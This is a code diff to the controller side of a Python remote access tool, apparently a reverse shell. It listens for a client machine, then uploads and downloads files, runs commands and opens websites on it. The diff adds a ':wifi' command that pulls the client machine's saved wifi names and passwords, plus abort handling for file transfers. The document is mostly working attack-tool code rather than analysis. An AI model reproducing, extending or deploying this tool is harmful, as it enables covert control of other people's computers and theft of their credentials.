@@ -39,7 +39,8 @@ Commands      Desscription
 :upload       Upload file to client machine
 :kill         Kill the connection with client machine
 :exec         Run external command
-:check        check if client machine is connected to internet
+:check        Check if client machine is connected to internet
+:wifi         Show Client machine wifi info [names,passwod,etc]
 :browse       Open an website on client machine browser
 pwd           Print working directory in client machine
 cd -          Switch back to previous directory in client machine
@@ -58,6 +59,11 @@ def download(filee):
      while True:
       data = controler.recv()
       if data == b":DONE:": break
+      elif data == b":Aborted:":
+        wf.close()
+        os.remove(filetodown)
+        print("[!] Downloading Has Aborted By Client!")
+        return
       wf.write(data)
      wf.close()
      print("[*] Download Complete :)\n[*] file Saved In : {}\n".format(os.getcwd()+os.sep+filetodown))
@@ -72,7 +78,14 @@ def upload(cmd):
           controler.send(cmd.encode("UTF-8"))
           print("[~] Uploading [ {} ]...".format(filetoup))
           wf = open(filetoup,"rb")
-          for data in wf: controler.send(data)
+          for data in wf:
+            try:
+              controler.send(data)
+            except(KeyboardInterrupt,EOFError):
+              wf.close()
+              controler.send(b":Aborted:")
+              print("[!] Uploading Has Been Aborted By User!\n")
+              return
           controler.send(b":DONE:")
           savedpath = controler.recv().decode("UTF-8")
           print("[*] Upload Complete :)\n[*] File uploaded in : "+str(savedpath).strip()+" in client machine\n")
@@ -91,14 +104,6 @@ def browse(cmd):
     print("[~] Opening [ {} ]...".format(url))
     controler.send(":browse {}".format(url).encode("UTF-8"))
     print("[*] Done \n")
-def checkcon():
-  try:
-    controler.send(b":checkcon:")
-    data = controler.recv().decode("UTF-8")
-    if data.strip(): return True
-    else: return False
-  except Exception: return False
-
 def control():
     try:
       cmd = str(input("[{}]:~# ".format(a[0])))
@@ -127,11 +132,20 @@ def control():
                os.system(cmd)
                print(" ")
            control()
-      elif ":browse" in cmd:
-        browse(cmd)
-        control()
       elif cmd == ":check":
         check_con()
+        control()
+      elif cmd == ":wifi":
+        controler.send(b":wifi")
+        info = controler.recv().decode("UTF-8","ignore")
+        print("[*] Geting Wifi profiles info...")
+        if info==":osnot:": print("[!] Sorry, i can't found wifi info of client machine!\n")
+        else:
+          print("[*] INFO:\n")
+          print(info + "\n")
+        control()
+      elif ":browse" in cmd:
+        browse(cmd)
         control()
       elif cmd.lower() == "cls" or cmd == "clear":
              os.system("cls||clear")
@@ -143,13 +157,19 @@ def control():
     except (KeyboardInterrupt, EOFError):
            print(" ")
            control()
-    except Exception:
-        if checkcon() == True: control()
-        else:
-              print("[!] Connection Lost to: "+a[0]+" !")
-              c.close()
-              s.close()
-              exit(1)
+    except socket.error:
+       print("[!] Connection Lost to: "+a[0]+" !")
+       c.close()
+       s.close()
+       exit(1)
+    except UnicodeEncodeError:
+        print(DATA)
+        print(" ")
+        control()
+    except Exception as e:
+       print("[!] An error occurred: "+str(e)+"\n")
+       control()
+
 def server(IP,PORT,senrev=senrev):
   global s
   global c
@@ -159,7 +179,7 @@ def server(IP,PORT,senrev=senrev):
   s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
   s.bind((IP,PORT))
   s.listen(1)
-  print("[*] Server started on | {}:{} | at [{}]".format(IP,PORT,datetime.now().strftime("%H:%M:%S")))
+  print("[*] Server started on > {}:{} < | at [{}]".format(IP,PORT,datetime.now().strftime("%H:%M:%S")))
   try:
     c,a = s.accept()
     controler = senrev(c)
